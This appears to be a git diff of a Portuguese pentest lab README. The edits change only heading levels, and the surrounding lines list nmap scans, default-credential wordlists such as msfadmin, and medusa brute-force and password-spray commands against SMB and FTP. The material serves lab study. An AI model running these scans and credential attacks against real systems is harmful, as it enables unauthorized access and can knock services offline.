@@ -34,34 +34,34 @@ Este repositório contém material destinado a ambientes controlados e para fins
 
 ## Verifica se o host está ativo.
 
-## 5.2 Mapeamento de portas e serviços (Nmap)
+# 5.2 Mapeamento de portas e serviços (Nmap)
 
 UDP scan:
 
 sudo nmap -v -sU -p <PORTAS> <TARGET_IP>
 
 
-# TCP SYN (stealth):
+## TCP SYN (stealth):
 
 sudo nmap -v -sS <TARGET_IP>
 
 
-# Versão do serviço + timing agressivo:
+## Versão do serviço + timing agressivo:
 
 sudo nmap -v -T5 -sS -sV -p <PORTA> <TARGET_IP>
 
 
-# Detecção completa (SO, versão, scripts):
+## Detecção completa (SO, versão, scripts):
 
 sudo nmap -A <TARGET_IP>
 
 
-# Detecção de sistema operacional:
+## Detecção de sistema operacional:
 
 sudo nmap -O <TARGET_IP>
 
 
-# Ignorar discovery e mostrar só portas abertas:
+## Ignorar discovery e mostrar só portas abertas:
 
 sudo nmap -v -T5 -sS -Pn --open <TARGET_IP>
 
@@ -76,12 +76,12 @@ ftp <TARGET_IP>
 
 # 5.4 Preparação de wordlists
 
-# Usuários:
+## Usuários:
 
 echo -e "user\nmsfadmin\nadmin\nroot" > user.txt
 
 
-# Senhas:
+## Senhas:
 
 echo -e "password\n123456\nwelcome\nmsfadmin" > senhas_spray.txt
 
@@ -105,9 +105,9 @@ medusa -h <TARGET_IP> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 10 | tee 
 medusa -h <TARGET_IP> -u msfadmin -P wordlists/small-pass.txt -M ftp | tee artifacts/medusa-ftp-output.txt
 
 
-# Atenção: -t define threads; threads muito altas podem derrubar serviços.
+## Atenção: -t define threads; threads muito altas podem derrubar serviços.
 
-## 5.6 Validação SMB (smbclient)
+# 5.6 Validação SMB (smbclient)
 smbclient -L //<TARGET_IP> -U msfadmin
 ## ou (não recomendado para repositório público)
 smbclient -L //<TARGET_IP> -U msfadmin%msfadmin
